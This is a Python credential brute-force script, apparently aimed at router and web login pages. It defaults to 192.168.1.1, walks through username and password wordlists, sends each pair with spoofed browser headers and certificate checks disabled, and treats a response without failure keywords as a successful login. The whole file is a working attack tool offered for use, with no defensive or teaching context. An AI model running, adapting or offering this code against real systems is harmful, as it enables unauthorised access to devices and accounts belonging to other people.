import requests
import sys

print("""__        _______ ____
\ \      / /  ___/ ___| YOUR
 \ \ /\ / /| |_  \___ \ LOGIN
  \ V  V / |  _|  ___) |PAGE
   \_/\_/  |_|   |____/ SPLOIT""")

usage = input("Show URL usage? y/n: ")
if usage.lower() == "y":
    print("Enter the login page URL, for example: https://site.com:1234/login-page/login.html ")
    print("- The file depends on how the login page was created, simply look at the login page URL and see if it has a file name. If not, just don't put anything after the URL.")
    print("- The port depends on whether the site supports HTTP or HTTPS. If it's on port 443, use HTTPS in the URL. If the site uses port 80, use HTTP in the URL. Or if the site has another service port, simply specify it in the URL.")
    print("URL format: http/https://<url>:<port>/<directory>/<login-file>")
else:
    pass

url = input("Router's ip (default: http://192.168.1.1): ") # Be sure about the router ip

if not url:
    url = 'http://192.168.1.1'

expression = {b"failed", b"error", b"incorrect", b"failure", b"try", b"again", b"invalid", b"upgrade", b"outdated", b"browser"} #you can add your own login page errors messages here

def brute(username, password, combinations_tested, total_combinations):
    data = {'username': username, 'password': password}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'DNT': '1',
        'Referer': 'http://192.168.1.1/',
        'Origin': 'http://192.168.1.1/',
    }
    try:
        a = requests.post(url, data=data, headers=headers, verify=False)
        r_content = a.content.lower()
    except requests.exceptions.SSLError as e:
        print("SSL error:", e)
        sys.exit(1)
    combinations_tested += 1
    sys.stdout.write("\rCombinations tested: {}/{}".format(combinations_tested, total_combinations))
    sys.stdout.flush()
    if b"upgrade" in r_content or b"outdated" in r_content or b"browser" in r_content:
        print("\nError:", r_content)
        print("\rIt's recommended to use wfs-browser-input.py")
        sys.exit()
    if not any(item in r_content for item in expression):
        print("\nBrute Forcing...")
        print("[+] Username: ", username)
        print("[+] Password: ", password)
        print("Server Response:", r_content)
        sys.exit()
    return combinations_tested

def main():
    combinations_tested = 0
    while True:
        usernames_file = input("Usernames file location (default: username.txt): ")
        if not usernames_file:
            usernames_file = "username.txt"
        passwords_file = input("Passwords file location (default: password.txt): ")
        if not passwords_file:
            passwords_file = "password.txt"

        try:
            with open(usernames_file, "r") as user_file:
                usernames = [u.strip() for u in user_file.readlines()]
            with open(passwords_file, "r") as pass_file:
                passwords = [p.strip() for p in pass_file.readlines()]
            break
        except FileNotFoundError:
            print("One or both files not found. Please provide valid file locations.")
        except PermissionError:
            print("Permission denied. Please check file permissions and try again.")
        except Exception as e:
            print(f"An error occurred while loading files: {e}")
    total_combinations = len(usernames) * len(passwords)
    try:
        for username in usernames:
            for password in passwords:
                combinations_tested = brute(username, password, combinations_tested, total_combinations)
    except KeyboardInterrupt:
        print("\n\033[91mExiting...\033[0m")

if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings()
    main()
